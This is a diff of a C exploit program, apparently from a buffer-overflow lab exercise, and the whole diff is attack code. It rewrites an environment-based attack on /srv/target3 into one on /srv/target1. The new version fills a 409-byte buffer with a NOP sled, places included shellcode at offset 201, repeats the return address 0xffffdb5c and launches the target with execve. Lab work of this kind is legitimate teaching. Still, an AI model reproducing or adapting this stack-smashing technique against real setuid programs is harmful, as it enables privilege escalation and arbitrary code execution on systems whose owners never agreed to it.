@@ -5,34 +5,40 @@
 #include <unistd.h>
 #include "shellcode.h"
 
-#define TARGET "/srv/target3"
+#define TARGET "/srv/target1"
 
-int main(void) {
-    char *args[] = {
-        TARGET,
-        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
-        NULL
-    };
+const int BUFFER_SIZE = 409;
+const int SHELLCODE_OFFSET = 201;
+const uint32_t RETURN_ADDRESS = 0xffffdb5c;
 
-    static char environment[400] = {0};
-    uint32_t base_address = 0xffffdec0;
+void prepareExploit(char *buffer) {
+    memset(buffer, 0x90, BUFFER_SIZE - 1);
+    memcpy(buffer + SHELLCODE_OFFSET, shellcode, sizeof(shellcode) - 1);
 
-    // Fill the environment buffer with NOPs
-    memset(environment, 0x90, sizeof(environment) - 1);
+    uint32_t *ptr = (uint32_t *)(buffer + SHELLCODE_OFFSET + sizeof(shellcode) - 1);
+    uint32_t *end = (uint32_t *)(buffer + BUFFER_SIZE - 1);
+    while (ptr < end) {
+        *ptr++ = RETURN_ADDRESS;
+    }
 
-    // Adjust return address in the environment
-    *((uint32_t *)(environment)) = base_address + 4;
-    *((uint32_t *)(environment + 4)) = base_address + 8;
+    buffer[BUFFER_SIZE - 1] = '\0';
+}
 
-    // Copy the shellcode to a specific offset within the environment
-    memcpy(environment + 201, shellcode, sizeof(shellcode));
+int main(void)
+{
+    char *args[3];
+    char *env[1];
+    char exploitBuffer[BUFFER_SIZE];
 
-    char *env[] = {environment};
+    prepareExploit(exploitBuffer);
 
-    // Attempt to execute the target binary with the crafted arguments and environment
+    args[0] = TARGET;
+    args[1] = exploitBuffer;
+    args[2] = NULL;
+
+    env[0] = NULL;
+
     execve(TARGET, args, env);
-
-    // If execve fails, print an error message
     fprintf(stderr, "execve failed.\n");
 
     return 0;
